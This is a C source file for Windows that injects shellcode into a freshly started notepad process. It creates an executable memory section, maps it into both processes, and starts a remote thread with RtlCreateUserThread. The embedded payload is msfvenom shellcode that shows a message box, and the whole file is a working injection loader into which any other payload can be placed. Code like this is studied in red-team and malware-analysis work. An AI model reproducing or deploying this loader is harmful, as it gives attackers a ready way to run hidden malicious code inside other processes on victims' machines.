#include <Windows.h>
#include <stdio.h>

DWORD create_notepad(void);
HANDLE create_section(void);
char *map_view(HANDLE process, HANDLE section);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI *NCS)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef NTSTATUS(NTAPI *NMVS)(
    IN HANDLE               SectionHandle,
    IN HANDLE               ProcessHandle,
    IN OUT PVOID            *BaseAddress OPTIONAL,
    IN ULONG_PTR            ZeroBits OPTIONAL,
    IN SIZE_T               CommitSize,
    IN OUT PLARGE_INTEGER   SectionOffset OPTIONAL,
    IN OUT PSIZE_T          ViewSize,
    IN SECTION_INHERIT      InheritDisposition,
    IN ULONG                AllocationType OPTIONAL,
    IN ULONG                Protect
);

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI *RCUT)(
    IN HANDLE               ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN              CreateSuspended,
    IN ULONG                StackZeroBits,
    IN OUT PULONG           StackReserved,
    IN OUT PULONG           StackCommit,
    IN PVOID                StartAddress,
    IN PVOID                StartParameter OPTIONAL,
    OUT PHANDLE             ThreadHandle,
    OUT PCLIENT_ID          ClientID
);

DWORD create_notepad(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        puts("[-] Create notepad fail.");
        return 0;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    return pi.dwProcessId;
}

HANDLE create_section(void)
{
    NCS             _NtCreateSection = NULL;
    HANDLE          section = NULL;
    SIZE_T          page_sz = 0x1000;

    _NtCreateSection = (NCS)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    if (!_NtCreateSection) {
        puts("[-] GetProcAddress fail.");
        return INVALID_HANDLE_VALUE;
    }

    if (!NT_SUCCESS(_NtCreateSection(
        &section,
        SECTION_MAP_EXECUTE | SECTION_MAP_WRITE | SECTION_MAP_READ,
        NULL,
        (PLARGE_INTEGER)&page_sz,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    ))) {
        puts("[-] CreateSection fail.");
        return INVALID_HANDLE_VALUE;
    }

    return section;
}

char *map_view(HANDLE process, HANDLE section)
{
    /*
        First we map local view as RW, copy shellcode, then map remote view as RE
    */

    // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
    unsigned char buf[327] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
        "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
        "\x85\x2e\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x73\x68\x65\x6c\x6c"
        "\x63\x6f\x64\x65\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x00"
        "\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";

    char    *local_base = NULL;
    char    *remote_base = NULL;
    NMVS    _NtMapViewOfSection = NULL;
    SIZE_T  page_sz = 0x1000;

    _NtMapViewOfSection = (NMVS)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
    if (!_NtMapViewOfSection) {
        puts("[-] GetProcAddress fail.");
        return NULL;
    }

    if (!NT_SUCCESS(_NtMapViewOfSection(
        section,
        GetCurrentProcess(),
        &local_base,
        NULL,
        NULL,
        NULL,
        &page_sz,
        ViewUnmap,
        NULL,
        PAGE_READWRITE
    ))) {
        puts("[-] map local section fail.");
        return NULL;
    }

    RtlMoveMemory(local_base, buf, sizeof(buf));

    // map remote view

    if (!NT_SUCCESS(_NtMapViewOfSection(
        section,
        process,
        &remote_base,
        NULL,
        NULL,
        NULL,
        &page_sz,
        ViewUnmap,
        NULL,
        PAGE_EXECUTE_READ
    ))) {
        puts("[-] map remote section fail.");
        return NULL;
    }

    return remote_base;
}

int main(void)
{
    DWORD       notepad_pid = 0;
    HANDLE      section = NULL, notepad = NULL, thread = NULL;
    char        *remote_base = NULL;
    RCUT        _RtlCreateUserThread = NULL;
    CLIENT_ID   cid = { 0 };

    notepad_pid = create_notepad();
    if (!notepad_pid)
        return 0;

    printf("[+] Notepad pid: %d\n", notepad_pid);

    section = create_section();
    if (section == INVALID_HANDLE_VALUE)
        return 0;

    printf("[+] section handle: 0x%x\n", (DWORD)section);

    notepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notepad_pid);
    if (!notepad) {
        puts("[-] OpenProcess fail.");
        CloseHandle(section);
        return 0;
    }

    remote_base = map_view(notepad, section);
    if (!remote_base) {
        CloseHandle(section);
        CloseHandle(notepad);
        return 0;
    }

    printf("[+] remote shellcode base: %p\n", remote_base);

    _RtlCreateUserThread = (RCUT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread");
    if (!_RtlCreateUserThread) {
        puts("[-] GetProcAddress fail.");
        CloseHandle(section);
        CloseHandle(notepad);
        return 0;
    }

    if (!NT_SUCCESS(_RtlCreateUserThread(
        notepad, 
        NULL, 
        FALSE, 
        0, 
        0, 
        0, 
        remote_base, 
        NULL, 
        &thread, 
        &cid
    ))) {
        puts("[-] RtlCreateUserThread fail.");
        CloseHandle(thread);
        CloseHandle(section);
        CloseHandle(notepad);
        return 0;
    }

    puts("[+] Injection success.");

    CloseHandle(thread);
    CloseHandle(section);
    CloseHandle(notepad);

    return 0;
}